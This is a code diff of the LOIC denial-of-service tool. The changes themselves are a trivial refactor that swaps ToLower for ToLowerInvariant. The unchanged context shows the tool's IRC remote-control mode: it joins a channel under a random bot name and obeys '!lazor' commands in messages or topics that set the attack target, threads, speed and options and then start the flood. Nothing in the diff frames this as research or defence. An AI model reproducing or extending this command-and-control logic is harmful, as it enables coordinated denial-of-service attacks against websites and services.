@@ -208,7 +208,7 @@ namespace LOIC
 		/// <param name="silent">Silent?</param>
 		private void LockOnURL(bool silent = false)
 		{
-			sHost = txtTargetURL.Text.ToLower();
+			sHost = txtTargetURL.Text.ToLowerInvariant();
 			if( String.IsNullOrEmpty(sHost) )
 			{
 				Wtf ("A URL is fine too...", silent);
@@ -280,7 +280,7 @@ namespace LOIC
 						int port;
 						if(!int.TryParse(txtIRCport.Text, out port)) port = 6667;
 						irc.Connect(txtIRCserver.Text, port);
-						channel = txtIRCchannel.Text.ToLower();
+						channel = txtIRCchannel.Text.ToLowerInvariant();
 
 						irc.Login("LOIC_" + Functions.RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
 
@@ -441,7 +441,7 @@ namespace LOIC
 		/// <param name="e">EventArgs.</param>
 		void OnTopic(object sender, TopicEventArgs e)
 		{
-			if(e.Channel.ToLower() == channel && e.Topic.StartsWith("!lazor "))
+			if(e.Channel.ToLowerInvariant() == channel && e.Topic.StartsWith("!lazor "))
 			{
 				List<string> pars = new List<string>(e.Topic.Split(' '));
 				SetStatus("Controlled by topic");
@@ -461,7 +461,7 @@ namespace LOIC
 		/// <param name="e">EventArgs.</param>
 		void OnTopicChange(object sender, TopicChangeEventArgs e)
 		{
-			if(e.Channel.ToLower() == channel && e.NewTopic.StartsWith("!lazor "))
+			if(e.Channel.ToLowerInvariant() == channel && e.NewTopic.StartsWith("!lazor "))
 			{
 				List<string> pars = new List<string>(e.NewTopic.Split(' '));
 				SetStatus("Controlled by topic");
@@ -530,7 +530,7 @@ namespace LOIC
 		/// <param name="e">EventArgs.</param>
 		void OnMessage(object sender, IrcEventArgs e)
 		{
-			if(e.Data.Channel.ToLower() == channel)
+			if(e.Data.Channel.ToLowerInvariant() == channel)
 			{
 				if(e.Data.Message.StartsWith("!lazor "))
 				{
@@ -574,7 +574,7 @@ namespace LOIC
 					}
 
 					int num;
-					switch (cmd.ToLower())
+					switch (cmd.ToLowerInvariant())
 					{
 						case "targetip":
 							txtTargetIP.Text = value;
@@ -608,21 +608,21 @@ namespace LOIC
 								txtThreads.Text = num.ToString();
 							break;
 						case "wait":
-							if(value.ToLower() == "true")
+							if(value.ToLowerInvariant() == "true")
 								chkWaitReply.Checked = true;
-							else if(value.ToLower() == "false")
+							else if(value.ToLowerInvariant() == "false")
 								chkWaitReply.Checked = false;
 							break;
 						case "random":
-							if(value.ToLower() == "true")
+							if(value.ToLowerInvariant() == "true")
 								chkAllowRandom.Checked = true;
-							else if(value.ToLower() == "false")
+							else if(value.ToLowerInvariant() == "false")
 								chkAllowRandom.Checked = false;
 							break;
 						case "gzip":
-							if(value.ToLower() == "true")
+							if(value.ToLowerInvariant() == "true")
 								chkAllowGzip.Checked = true;
-							else if(value.ToLower() == "false")
+							else if(value.ToLowerInvariant() == "false")
 								chkAllowGzip.Checked = false;
 							break;
 						case "speed":
@@ -633,12 +633,12 @@ namespace LOIC
 				}
 				else
 				{
-					if(sp[0].ToLower() == "start")
+					if(sp[0].ToLowerInvariant() == "start")
 					{
 						Attack(false, true, true);
 						return;
 					}
-					else if(sp[0].ToLower() == "default")
+					else if(sp[0].ToLowerInvariant() == "default")
 					{
 						txtTargetIP.Text = "";
 						txtTargetURL.Text ="";
